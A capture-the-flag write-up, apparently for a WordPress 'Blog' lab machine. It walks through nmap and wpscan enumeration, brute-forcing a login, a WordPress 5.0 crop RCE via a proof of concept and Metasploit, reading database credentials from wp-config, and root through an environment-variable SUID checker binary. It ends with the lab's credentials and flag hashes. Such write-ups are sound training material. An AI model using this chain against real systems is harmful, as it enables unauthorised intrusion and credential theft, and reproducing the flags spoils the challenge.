`Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-21 20:14 UTC`
`Nmap scan report for 10.201.60.195`
`Host is up (0.13s latency).`
`Not shown: 65531 closed tcp ports (reset)`
`PORT    STATE SERVICE     VERSION`
`22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)`
`| ssh-hostkey:` 
`|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)`
`|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)`
`|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)`
`80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))`
`|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog`
`|_http-generator: WordPress 5.0`
`| http-robots.txt: 1 disallowed entry` 
`|_/wp-admin/`
`|_http-server-header: Apache/2.4.29 (Ubuntu)`
`139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)`
`445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)`
`Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel`

`Host script results:`
`|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)`
`| smb2-time:` 
`|   date: 2025-10-21T20:15:44`
`|_  start_date: N/A`
`| smb-security-mode:` 
`|   account_used: guest`
`|   authentication_level: user`
`|   challenge_response: supported`
`|_  message_signing: disabled (dangerous, but default)`
`| smb-os-discovery:` 
`|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)`
`|   Computer name: blog`
`|   NetBIOS computer name: BLOG\x00`
`|   Domain name: \x00`
`|   FQDN: blog`
`|_  System time: 2025-10-21T20:15:44+00:00`
`| smb2-security-mode:` 
`|   3:1:1:` 
`|_    Message signing enabled but not required`

`Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .`
`Nmap done: 1 IP address (1 host up) scanned in 104.86 seconds`

We can see the webserver is using WordPress at a CMS.
Running the following scan
`wpscan --url http://blog.thm --enumerate u,vp,vt`

Gives us the following:

**Usernames:**
kwheel
bjoel

**Theme:**
twentytwenty

**Version:**
5.0

**External access to uploads is enabled**
http://blog.thm/wp-content/uploads/

Running Apache/2.4.29

Subdirectories:
http://blog.thm/admin

It's also important to note that xml-rpc is enabled.
"XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php"

This will allow us to bruteforce logins via wpscan, as it can use the backend to authenticate.
Running wpscan with:
wpscan --url http://blog.thm/ --passwords /usr/share/wordlists/rockyou.txt --usernames users.txt

Users in users.txt:                                                                        
kwheel
bjoel

This will give us these credentials:
kwheel / cutiepie1

We can run a RCE POC via
https://github.com/ret2x-tools/poc-wordpress-5.0.0

This gives us a shell. 
www-data@blog:/var/www/wordpress$ ls
ls
index.php        wp-blog-header.php    wp-cron.php        wp-mail.php
license.txt      wp-comments-post.php  wp-includes        wp-settings.php
readme.html      wp-config-sample.php  wp-links-opml.php  wp-signup.php
wp-activate.php  wp-config.php         wp-load.php        wp-trackback.php
wp-admin         wp-content            wp-login.php       xmlrpc.php

We get the following information from wp-config.php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'blog');

/** MySQL database username */
define('DB_USER', 'wordpressuser');

/** MySQL database password */
define('DB_PASSWORD', 'LittleYellowLamp90!@');

/** MySQL hostname */
define('DB_HOST', 'localhost');

This tells us the DB schema, a username and password, and that the database is only hosted locally. 

Stabilize shell using 
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Login to mysql
mysql -u wordpressuser -p
Enter password: LittleYellowLamp90!@

we find the wp_users table and we find the following information:

`bjoel:$P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/`

Did my best to crack this via hashcat and got absolutely nothing.
I spent about 5 hours on trying to find the entry point for privesc and truly got nothing worth noting.

Had to lookup how to finish this and just do my best to learn.

We can use /multi/http/wp_crop_rce from msfconsole as this is the same thing as that POC.
Set options and execute and get meterpreter session.
Create a shell and find SUID binaries.
There is a binary that is /usr/sbin/checker that is out of place.
We can use meterpreter to download this and analyze it with Ghidra. (this is my first time ever using it)

Decompiling this code we can find that that the assembly checks for an env variable to see if you are "admin" and then sets UID to 0. We can exploit this.


undefined8 main(void)

{
  char *pcVar1;
  
  pcVar1 = getenv("admin");
  if (pcVar1 == (char *)0x0) {
    puts("Not an Admin");
  }
  else {
    setuid(0);
    system("/bin/bash");
  }
  return 0;
}

In my amateur analysis this just checks if there is no variable set... if we set one we can run "checker."

So i set it as "export admin="kwheel"
then ran /usr/sbin/checker
Annnndd we are root.
Find user.txt:
find / -name user.txt 2>/dev/null
find root.txt:
find / -name root.txt 2>/dev/null

root: 9a0b2b618bef9bfa7ac28c1353d9f318
user: c8421899aae571f7af486492b71a8ab7

Thanks for stopping by!






















